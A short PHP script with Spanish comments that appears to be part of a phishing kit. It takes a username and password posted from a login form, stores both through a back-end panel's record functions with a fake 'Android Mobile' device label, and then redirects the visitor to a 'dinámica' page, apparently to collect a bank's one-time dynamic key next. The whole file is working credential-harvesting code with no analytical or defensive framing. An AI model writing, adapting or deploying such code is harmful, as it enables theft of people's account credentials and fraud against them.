<?php
// process/pasousuario.php
require('../panel/lib/funciones.php');

$user = $_POST['txt-usuario'] ?? '';
$pass = $_POST['txt-password'] ?? ''; 
$dispositivo = "Android Mobile"; 

if (!empty($user) && !empty($pass)) {
    // 1. Creamos o actualizamos el registro
    $id = crear_registro($user, $dispositivo);
    
    // 2. Le añadimos la clave
    actualizar_registro_pass($id, $pass);
    
    // 3. CAMBIO CLAVE: En lugar de WAITING, lo mandamos a la DINÁMICA
    header("Location: ../a/dinamica.php");
} else {
    header("Location: ../index.php");
}
exit();
